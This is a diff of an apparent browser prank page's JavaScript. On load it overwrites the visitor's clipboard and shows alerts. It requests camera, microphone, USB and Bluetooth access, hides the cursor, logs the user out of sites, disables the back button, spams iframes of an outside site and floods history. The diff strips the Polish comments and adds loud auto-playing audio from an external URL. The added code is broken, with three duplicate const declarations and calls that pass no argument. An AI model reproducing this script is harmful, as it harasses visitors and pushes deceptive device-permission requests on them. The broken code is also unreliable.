@@ -81,7 +81,7 @@ function main() {
 
         navigator.clipboard.writeText(randomString).then(() => {
 
-            console.log('Skopiowano do schowka:', randomString);
+            console.log(randomString);
 
         });
 
@@ -134,13 +134,13 @@ function main() {
 
             .then(stream => {
 
-                console.log('Uprawnienia przyznane');
+                console.log('1');
 
             })
 
             .catch(err => {
 
-                console.log('Błąd przyznawania uprawnień:', err);
+                console.log(err);
 
             });
 
@@ -169,13 +169,13 @@ function main() {
 
             .then(device => {
 
-                console.log('Uprawnienia do USB przyznane:', device);
+                console.log(device);
 
             })
 
             .catch(err => {
 
-                console.log('Błąd przyznawania uprawnień do USB:', err);
+                console.log(err);
 
             });
 
@@ -187,13 +187,13 @@ function main() {
 
             .then(device => {
 
-                console.log('Uprawnienia do Bluetooth przyznane:', device);
+                console.log(device);
 
             })
 
             .catch(err => {
 
-                console.log('Błąd przyznawania uprawnień do Bluetooth:', err);
+                console.log(err);
 
             });
 
@@ -281,7 +281,7 @@ function main() {
 
             const iframe = document.createElement('iframe');
 
-            iframe.src = 'http://ptoszek.pl'; // Zmień na odpowiedni URL
+            iframe.src = 'http://ptoszek.pl';
 
             document.body.appendChild(iframe);
 
@@ -302,34 +302,73 @@ function main() {
 
     }
 
+    function playMusic(url) {
+    const audio = new Audio(url);
+    
+    audio.volume = 1.0;
+
+    audio.play().catch(error => {
+        console.error(error);
+    });
+}
+
+const musicUrl = 'https://hazetlab.github.io/zerfithel/media/video.mp3';
+playMusic(musicUrl);
+
+    function playMusic2(url) {
+    const audio = new Audio(url);
+    
+    audio.volume = 1.0;
+
+    audio.play().catch(error => {
+        console.error(error);
+    });
+}
+
+const musicUrl = 'https://hazetlab.github.io/zerfithel/media/video.mp3';
+playMusic(musicUrl);
+
+    function playMusic3(url) {
+    const audio = new Audio(url);
+    
+    audio.volume = 1.0;
+
+    audio.play().catch(error => {
+        console.error(error);
+    });
+}
+
+const musicUrl = 'https://hazetlab.github.io/zerfithel/media/video.mp3';
+playMusic(musicUrl);
+    
 
     // Wywołanie funkcji
 
-    copyRandomString(); // Kopiowanie losowego ciągu
+    playMusic();
+    playMusic2();
+    playMusic3();
+    
+    copyRandomString();
 
-    randomAlert(); // Wyświetlanie losowego alertu
+    randomAlert();
 
-    openMovingVideo(); // Otwieranie wideo w ruchu
+    openMovingVideo();
 
-    requestCameraAndMicrophone(); // Prośba o uprawnienia do kamery i mikrofonu
+    requestCameraAndMicrophone();
 
-    hideCursor(); // Ukrywanie kursora
+    hideCursor();
 
-    speakText("VBUCK GENERATOR AAAAKWA"); // Mówienie tekstu
+    requestUSBPermission();
 
-    requestUSBPermission(); // Prośba o uprawnienia do USB
+    requestBluetoothPermission();
 
-    requestBluetoothPermission(); // Prośba o uprawnienia do Bluetooth
+    logoutFromSites();
 
-    logoutFromSites(); // Wylogowanie z podanych stron
+    disableBack(); 
 
-    disableBack(); // Wyłączenie przycisku wstecz
+    iframeSpam(); 
 
-    iframeSpam(); // Spamowanie iframe
-
-    fillHistory(); // Wypełnienie historii
-
-
+    fillHistory(); 
 
 }
 
